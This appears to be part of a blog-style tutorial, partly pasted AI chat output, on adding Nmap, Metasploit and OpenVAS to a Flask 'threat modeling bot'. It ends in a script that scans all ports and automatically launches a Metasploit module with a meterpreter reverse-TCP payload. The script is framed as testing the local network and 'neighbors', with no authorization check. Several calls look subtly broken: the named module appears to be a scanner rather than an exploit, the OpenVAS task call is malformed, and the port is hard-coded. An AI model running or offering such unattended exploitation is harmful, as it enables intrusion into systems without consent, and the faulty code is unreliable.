# ThreatSentry - An advanced threat modeling bot (part 3)

## 3. Integration with Penetration Testing Tools

Certainly! Here's an updated version using open-source tools for integration with a Flask application:

1. Nmap for Network Scanning:

   - Nmap is an open-source network scanning tool that helps identify hosts, open ports, and services running on a network.

   - You can use the python-nmap library, which provides a Python interface for Nmap, to integrate it into your Flask application.

   - Here's an example code snippet to perform a basic network scan using Nmap:

   ```python
   import nmap

   def perform_network_scan(target_ip):
       scanner = nmap.PortScanner()
       scanner.scan(target_ip, arguments='-p-')  # Scan all ports

       open_ports = []
       for host in scanner.all_hosts():
           for proto in scanner[host].all_protocols():
               for port in scanner[host][proto]:
                   if scanner[host][proto][port]['state'] == 'open':
                       open_ports.append(port)

       return open_ports
   ```

2. Metasploit Framework for Exploitation:

   - Metasploit Framework is an open-source penetration testing framework that provides a collection of exploit modules.

   - You can utilize the Metasploit Framework's msfrpc library to integrate it with your Flask application.

   - Here's an example code snippet to demonstrate executing a Metasploit module using the msfrpc library:

   ```python
   from msfrpc import MsfRpcClient

   def exploit_target(target_ip, target_port):
       client = MsfRpcClient('YOUR_METASPLOIT_API_TOKEN')
       exploit_module = client.modules.use('exploit', 'exploit/multi/http/webdav_internal_ip')

       exploit_module['RHOSTS'] = target_ip
       exploit_module['RPORT'] = target_port

       session = exploit_module.execute(payload='python/meterpreter/reverse_tcp')

       return session
   ```

3. OpenVAS for Vulnerability Scanning:

   - OpenVAS is an open-source vulnerability scanning tool that can identify security weaknesses in target systems.

   - You can use the python-gvm library, which provides a Python interface for OpenVAS/GVM, to integrate it into your Flask application.

   - Here's an example code snippet to initiate a vulnerability scan using OpenVAS:

   ```python
   from gvm.connections import TLSConnection
   from gvm.protocols.gmp import Gmp
   from gvm.transforms import EtreeTransform

   def initiate_vulnerability_scan(target_ip):
       connection = TLSConnection(hostname='openvas_server', port=9390)
       transform = EtreeTransform()

       with Gmp(connection, transform=transform) as gmp:
           gmp.authenticate('username', 'password')
           scan_id = gmp.create_task(target=target_ip)

           # Start the scan
           gmp.start_task(scan_id)

           return scan_id
   ```

Please note that these code snippets are simplified examples, and you would need to install the respective libraries (`python-nmap`, `msfrpc`, `python-gvm`) to use them in your Flask application. Additionally, ensure you have the necessary credentials and proper access to use these open-source tools within your application.

Now, for a practical example, lets do a script un python for testing local network and neighbors:

  ```python
import nmap
from msfrpc import MsfRpcClient
from gvm.connections import TLSConnection
from gvm.protocols.gmp import Gmp
from gvm.transforms import EtreeTransform

# Perform network scan using Nmap
def perform_network_scan(target_ip):
    scanner = nmap.PortScanner()
    scanner.scan(target_ip, arguments='-p-')  # Scan all ports

    open_ports = []
    for host in scanner.all_hosts():
        for proto in scanner[host].all_protocols():
            for port in scanner[host][proto]:
                if scanner[host][proto][port]['state'] == 'open':
                    open_ports.append(port)

    return open_ports

# Exploit target using Metasploit Framework
def exploit_target(target_ip, target_port):
    client = MsfRpcClient('YOUR_METASPLOIT_API_TOKEN')
    exploit_module = client.modules.use('exploit', 'exploit/multi/http/webdav_internal_ip')

    exploit_module['RHOSTS'] = target_ip
    exploit_module['RPORT'] = target_port

    session = exploit_module.execute(payload='python/meterpreter/reverse_tcp')

    return session

# Initiate vulnerability scan using OpenVAS
def initiate_vulnerability_scan(target_ip):
    connection = TLSConnection(hostname='openvas_server', port=9390)
    transform = EtreeTransform()

    with Gmp(connection, transform=transform) as gmp:
        gmp.authenticate('username', 'password')
        scan_id = gmp.create_task(target=target_ip)

        # Start the scan
        gmp.start_task(scan_id)

        return scan_id

# Execute the scan, detect, and vulnerability check
def execute_network_security_check(target_ip):
    # Network scan using Nmap
    open_ports = perform_network_scan(target_ip)

    # Exploit target using Metasploit Framework
    session = exploit_target(target_ip, 80)  # Adjust the target port as needed

    # Initiate vulnerability scan using OpenVAS
    scan_id = initiate_vulnerability_scan(target_ip)

    # Save the outputs to separate TXT files
    with open('network_scan_output.txt', 'w') as f:
        f.write('Open Ports:\n')
        for port in open_ports:
            f.write(f'{port}\n')

    with open('exploit_output.txt', 'w') as f:
        f.write('Exploit Session:\n')
        f.write(f'{session}\n')

    with open('vulnerability_scan_output.txt', 'w') as f:
        f.write('Scan ID:\n')
        f.write(f'{scan_id}\n')

    print('Network security check completed. Results saved to TXT files.')

# Execute the script with your localhost IP as the target
execute_network_security_check('localhost')
  ```
